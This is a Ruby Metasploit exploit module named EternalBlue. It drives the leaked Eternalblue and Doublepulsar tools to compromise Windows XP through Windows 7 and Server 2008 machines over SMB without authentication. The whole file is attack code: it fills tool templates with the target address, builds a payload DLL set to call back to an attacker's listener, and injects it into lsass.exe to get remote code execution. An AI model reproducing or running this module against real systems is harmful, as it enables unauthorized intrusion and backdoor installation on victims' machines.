require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote

  #include Msf::Exploit::Remote::DCERPC
  include Msf::Exploit::Remote::SMB::Client

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'EternalBlue',
      'Description' => %q{
          This module exploits a vulnerability on SMBv1/SMBv2 protocols through Eternalblue. 
	  After that, doublepulsar is used to inject remotely a malicious dll (it's will generate based on your 	  payload selection).
	  You can use this module to compromise a host remotely (among the targets available) without needing 		  nor authentication neither target's user interaction.
	  ** THIS IS AN INTEGRATION OF THE ORIGINAL EXPLOIT, IT'S NOT THE FULL PORTATION **
      },
      'Author'      =>
        [
          'Pablo Gonzalez (@pablogonzalezpe)',
          'Sheila A. Berta (@UnaPibaGeek)',
          'BUPTCZQ'
        ],
      'Platform'       => 'win',
      'DefaultTarget'  => 8,
      'Targets'        =>
        [
	  ['Windows XP (all services pack) (x86) (x64)',{}],
	  ['Windows Server 2003 SP0 (x86)',{}],
	  ['Windows Server 2003 SP1/SP2 (x86)',{}],
	  ['Windows Server 2003 (x64)',{}],
          ['Windows Vista (x86)',{}],
	  ['Windows Vista (x64)',{}],
	  ['Windows Server 2008 (x86) ',{}],
	  ['Windows Server 2008 R2 (x86) (x64)',{}],
	  ['Windows 7 (all services pack) (x86) (x64)',{}]
	],
      'Arch'           => [ARCH_X86,ARCH_X64],
	  'ExitFunc'	   => 'thread',
	  'Target'		   => 8,
      'License'     => MSF_LICENSE,
		)

		)

	register_options([
		OptEnum.new('TARGETARCHITECTURE', [true,'Target Architecture','x64',['x86','x64']]),
		OptString.new('TOOLKITPATH',[true,'Path directory of Eternalblue toolkit','d:\\shadowbroker\\windows\\lib\\x86-Windows\\']),
		OptString.new('PROCESSINJECT',[true,'Name of process to inject into (wlms.exe for x86, lsass.exe for x64)','lsass.exe'])
	], self.class)

  register_advanced_options([
    OptInt.new('TimeOut',[false,'Timeout for blocking network calls (in seconds)',60]),
    OptString.new('DLLName',[true,'DLL name for Doublepulsar','eternal11.dll'])
  ], self.class)

  end

  def exploit

  #Custom XML Eternalblue
  print_status('Generating Eternalblue XML data')
  cp = `cp #{datastore['TOOLKITPATH']}/Eternalblue-2.2.0.Skeleton.xml #{datastore['TOOLKITPATH']}/Eternalblue-2.2.0.xml`
  sed = `sed -i 's/%RHOST%/#{datastore['RHOST']}/' #{datastore['TOOLKITPATH']}/Eternalblue-2.2.0.xml`
  sed = `sed -i 's/%RPORT%/#{datastore['RPORT']}/' #{datastore['TOOLKITPATH']}/Eternalblue-2.2.0.xml`
  sed = `sed -i 's/%TIMEOUT%/#{datastore['TIMEOUT']}/' #{datastore['TOOLKITPATH']}/Eternalblue-2.2.0.xml`

  #WIN72K8R2 (4-8) and XP (0-3)
  if target.name =~ /7|2008|Vista/
	objective = "WIN72K8R2"
  else
	objective = "XP"
  end

  sed = `sed -i 's/%TARGET%/#{objective}/' #{datastore['TOOLKITPATH']}/Eternalblue-2.2.0.xml`

  #Custom XML Doublepulsar
  print_status('Generating Doublepulsar XML data')
  cp = `cp #{datastore['TOOLKITPATH']}/Doublepulsar-1.3.1.Skeleton.xml #{datastore['TOOLKITPATH']}/Doublepulsar-1.3.1.xml`
  sed = `sed -i 's/%RHOST%/#{datastore['RHOST']}/' #{datastore['TOOLKITPATH']}/Doublepulsar-1.3.1.xml`
  sed = `sed -i 's/%RPORT%/#{datastore['RPORT']}/' #{datastore['TOOLKITPATH']}/Doublepulsar-1.3.1.xml`
  sed = `sed -i 's/%TIMEOUT%/#{datastore['TIMEOUT']}/' #{datastore['TOOLKITPATH']}/Doublepulsar-1.3.1.xml`
  sed = `sed -i 's/%TARGETARCHITECTURE%/#{datastore['TARGETARCHITECTURE']}/' #{datastore['TOOLKITPATH']}/Doublepulsar-1.3.1.xml`
  sed = `sed -i 's/%DLLPAY%/#{datastore['DLLName']}/' #{datastore['TOOLKITPATH']}/Doublepulsar-1.3.1.xml`
  sed = `sed -i 's/%PROCESSINJECT%/#{datastore['PROCESSINJECT']}/' #{datastore['TOOLKITPATH']}/Doublepulsar-1.3.1.xml`

  #Generate DLL
  dllpayload = File.join(datastore['TOOLKITPATH'], datastore['DLLName'])
  print_status("Generating payload DLL for Doublepulsar")
  pay = framework.modules.create(datastore['payload'])
  pay.datastore['LHOST'] = datastore['LHOST']
  pay.datastore['LPORT'] = datastore['LPORT']
  dll = pay.generate_simple({'Format'=>'dll'})
  File.open(dllpayload,'wb') do |f|
	print_status("Writing DLL in #{dllpayload}")
	f.print dll
  end

  #Send Exploit + Payload Injection
  print_status('Launching Eternalblue...')
  output = `cd /d #{datastore['TOOLKITPATH']} && Eternalblue-2.2.0.exe`
  if output =~ /=-=-WIN-=-=/
  	print_good("Pwned! Eternalblue success!")
  elsif output =~ /Backdoor returned code: 10 - Success!/
	print_good("Backdoor is already installed")
  else
	print_error("Are you sure it's vulnerable?")
  end
  print_status('Launching Doublepulsar...')
  output2 = `cd /d #{datastore['TOOLKITPATH']} && Doublepulsar-1.3.1.exe`
  if output2 =~ /Backdoor returned code: 10 - Success!/
	print_good("Remote code executed... 3... 2... 1...")
  else
	print_error("Oops, something was wrong!")
  end  

  handler

 end

end





